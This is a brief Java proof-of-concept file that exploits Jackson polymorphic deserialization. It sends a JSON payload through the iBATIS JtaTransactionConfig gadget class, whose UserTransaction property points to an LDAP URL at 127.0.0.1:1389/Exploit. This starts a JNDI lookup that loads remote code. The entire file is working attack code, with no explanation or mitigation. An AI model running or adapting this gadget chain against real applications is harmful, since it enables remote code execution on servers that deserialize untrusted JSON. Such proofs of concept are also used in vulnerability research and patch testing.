package com.test.jackson;

import com.fasterxml.jackson.annotation.JsonIgnoreProperties;
import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.jsontype.BasicPolymorphicTypeValidator;
import com.fasterxml.jackson.databind.jsontype.PolymorphicTypeValidator;

/**
 * <dependency>
 *       <groupId>org.apache.ibatis</groupId>
 *       <artifactId>ibatis-sqlmap</artifactId>
 *       <version>2.3.4.726</version>
 * </dependency>
 * @Author:Wadewfsssss
 */

public class JtaTransactionConfig {
    @JsonIgnoreProperties
    public static void main(String[] args) throws Exception {


        String payload = "[\"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\"," +
                "{\"properties\":{\"UserTransaction\":\"ldap://127.0.0.1:1389/Exploit\"}}]";
        ObjectMapper mapper = new ObjectMapper();

        PolymorphicTypeValidator ptv = BasicPolymorphicTypeValidator.builder().allowIfSubType(com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig.class).build();
        mapper.activateDefaultTyping(ptv);


        mapper.readValue(payload, Object.class);
    }
}
